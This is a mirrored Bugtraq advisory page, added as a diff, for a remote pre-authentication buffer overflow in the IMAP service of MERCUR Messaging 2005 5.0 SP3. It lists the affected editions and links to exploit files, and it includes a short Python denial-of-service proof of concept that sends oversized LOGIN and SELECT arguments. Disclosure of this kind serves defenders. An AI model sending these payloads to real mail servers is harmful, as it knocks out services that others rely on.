@@ -1,0 +1,105 @@
+#SpeeDr00t@Black Falcon<br>#bid17138<p><b><span style="font-size: 18pt;">MERCUR Messaging 2005 IMAP Remote Buffer Overflow Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/17138/info">info</a><br><a href="http://www.securityfocus.com/bid/17138/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/17138/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/17138/solution">solution</a><br><a href="http://www.securityfocus.com/bid/17138/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				17138
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Mar 17 2006 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jan 16 2007 06:00PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovered by Tim Taylor.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Atrium Software MERCUR Messaging 2005 Standard Edition  5.0 SP3<br/>
+					
+				
+					Atrium Software MERCUR Messaging 2005 Lite Edition  5.0 SP3<br/>
+					
+				
+					Atrium Software MERCUR Messaging 2005 Enterprise Edition  5.0 SP3<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x18000/17138/mercur.cpp">#exploit_mercur.cpp</a><br><a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x18000/17138/mercur_imap_select_overflow.pm">#exploit_mercur_imap_select_overflow.pm</a><br><a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x18000/17138/mercur-login-17138.pl">#exploit_mercur-login-17138.pl</a><br><a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x18000/17138/17148Jan152007.pl">#exploit_17148Jan152007.pl</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following proof of concept is available:<br/><br/>-- DoS Exploit --<br/># Atrium Mercur IMAP 5.0 SP3 DoS Exploit<br/># pre authentifcation buffer overflow in imap command login<br/>import socket<br/>s=socket.socket()<br/>s.connect(("127.0.0.1", 143))<br/>print s.recv(256)<br/>s.send("a001 login "\x41" * 275 + "\r\n")<br/><br/># buffer overflow in imap commands like select and others<br/>import socket<br/>s=socket.socket()<br/>s.connect(("127.0.0.1", 143))<br/>print s.recv(256)<br/>s.send("a001 login test test\r\n")<br/>print s.recv(256)<br/>s.send("a002 select " + "\x41" * 239 + "\r\n").<br/><br/> <br/>Exploit code as part of the Metasploit Framework project has been released.
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/mercur.cpp">/data/vulnerabilities/exploits/mercur.cpp</a></li>
+<li><a href="/data/vulnerabilities/exploits/mercur_imap_select_overflow.pm">/data/vulnerabilities/exploits/mercur_imap_select_overflow.pm</a></li>
+<li><a href="/data/vulnerabilities/exploits/mercur-login-17138.pl">/data/vulnerabilities/exploits/mercur-login-17138.pl</a></li>
+<li><a href="/data/vulnerabilities/exploits/17148Jan152007.pl">/data/vulnerabilities/exploits/17148Jan152007.pl</a></li>
+</ul>
+</div>
